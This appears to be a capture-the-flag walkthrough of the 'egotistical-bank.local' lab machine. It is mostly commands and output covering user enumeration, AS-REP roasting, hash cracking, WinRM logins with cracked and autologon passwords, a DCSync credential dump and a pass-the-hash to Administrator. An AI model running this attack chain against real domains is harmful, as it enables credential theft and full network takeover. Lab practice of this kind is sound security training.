### rpcclient
```
❯ export IP=10.129.114.52
                                                                                                                                                                                            
❯ rpcclient -U "" -N $IP
rpcclient $> enumdomusers 
result was NT_STATUS_ACCESS_DENIED
rpcclient $> queryinfo
command not found: queryinfo
rpcclient $> querydispinfo
result was NT_STATUS_ACCESS_DENIED
rpcclient $> 
```

### SMB
```bash
❯ smbclient -N -L \\\\$IP\\
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.95.180 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
                                                                                                                                                                                            
❯ smbmap -H $IP
[+] IP: 10.129.95.180:445       Name: 10.129.95.180    
```

##### try default users since no luck above
```bash
smbmap -H $IP -u guest
smbmap -H $IP -u anonymous
smbmap -H $IP -u KRBTGT
smbmap -H $IP -u HelpAssistant
smbmap -H $IP -u DefaultAccount
smbmap -H $IP -u System
smbmap -H $IP -u 'Network Service'
smbmap -H $IP -u LocalService
smbmap -H $IP -u Administrator
smbmap -H $IP -u Fergus
smbmap -H $IP -u Hugo
smbmap -H $IP -u Steven
smbmap -H $IP -u Shaun
smbmap -H $IP -u Bowie
smbmap -H $IP -u Sophie
```

### ldapsearch
```bash
ldapsearch -x -H ldap://10.129.95.180 -b "dc=egotistical-bank,dc=local" -s base '(objectclass=*)' > with_dc.txt
```

##### get naming contexts
`ldapsearch -h $IP -x -s base namingcontexts` <- syntax not always working

`ldapsearch -x -H ldap://$IP -b "dc=egotistical-bank,dc=local" -s base namingcontexts`

##### Try ldapdomaindump since nothing above
```bash
ldapdomaindump egotistical-bank.local
````

### DNS
`egotistical-bank.local` as the nmap result

```
dig @$IP egotistical-bank.local
```

### Try to make a User List
```bash
crackmapexec smb $IP --users    # no auth
```

### Grab usernames from website
```
impacket-GetNPUsers egotistical-bank.local/ -dc-ip $IP -no-pass -usersfile user.txt 
```

```bash
/opt/kerbrute_linux_amd64 userenum -d egotistical-bank.local --dc $IP /usr/share/wordlists/seclists/Usernames/Names/names.txt
/opt/kerbrute_linux_amd64 userenum -d egotistical-bank.local --dc $IP /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames-dup.txt
```
```bash
impacket-GetNPUsers egotistical-bank.local/ -dc-ip $IP -no-pass -usersfile user.txt 
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
```

### Nothing above so far

### snmp-check
nothing

### Username anarchy from website as source
```
./username-anarchy/username-anarchy --input-file use_less.users --select-format f.last > f.last
./username-anarchy/username-anarchy --input-file use_less.users --select-format flast > flast
```

```bash
impacket-GetNPUsers egotistical-bank.local/ -dc-ip $IP -no-pass -usersfile flast
```


[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:7458bd3e6747eb62d69e68c615ab3a8a$a2486fdfcfd66421bd7f4caa290da3c99bb3c4d23dcb51cdecd69f2431a2061e62335c9676e11a4e54565d61683222f4defc0a2539e1e074b23c55f4c6e5bcfb3972efc01c101cf54eb69b0545e721e850ebc0abe2f9ee8958db102e8473fe5876f28c380778f763366608b6f57427120cd9690dbcfdd6d2081e2695d22160c5d3c4dec55e98fb3c3c9cee0435130aeeb811cb8d2e3f58349d5c6d705ec802bc4b4de676de945021b917e4b870f701300c62543fda3d6ff7bae1d3cee608846abd48edce7df3a031fe2ed9c51961b178e75a742d3b4598411606b32efa137989a43dbf06d67c9e05cfda3afe3c799f0b11ad01d21a65561f6fccb701240278bb

### Crack Hash
```
❯ hashcat -m 18200 --force -a 0 hash /usr/share/wordlists/rockyou.txt
```

fsmith@EGOTISTICAL-BANK.LOCAL
Thestrokes23

### Foothold
```bash
evil-winrm -i $IP -u fsmith -p Thestrokes23
```

### winPEASx64.exe
```cmd
.\winPEASx64.exe cmd fast > winpeas_fast
```

### Sed to print all lines
```bash
sed -n -e 300,500p winpeas_fast
```
    Some AutoLogon credentials were found
    DefaultDomainName             :  EGOTISTICALBANK
    DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager
    DefaultPassword               :  Moneymakestheworldgoround!

### Second Foothold after lateral movement
```
*Evil-WinRM* PS C:\Users\FSmith\Documents> net users

User accounts for \\

-------------------------------------------------------------------------------
Administrator            FSmith                   Guest
HSmith                   krbtgt                   svc_loanmgr
```
```bash
evil-winrm -i $IP -u svc_loanmgr -p Moneymakestheworldgoround!
```

### BloodHound 
Look in to `Reachable High Value Targets` or `Effective Inbound GPOs` under `Node Info`.

### Try Dsync attack
```bash
impacket-secretsdump -just-dc svc_loanmgr:'Moneymakestheworldgoround!'@$IP
```

### Root
`evil-winrm -i $IP -u Administrator -H 823452073d75b9d1cf70ebdf86c7f98e`

### Alternatively by using mimikatz
```
.\mimikatz.exe "lsadump::dcsync /domain:EGOTISTICAL-BANK.LOCAL /user:Administrator" exit
```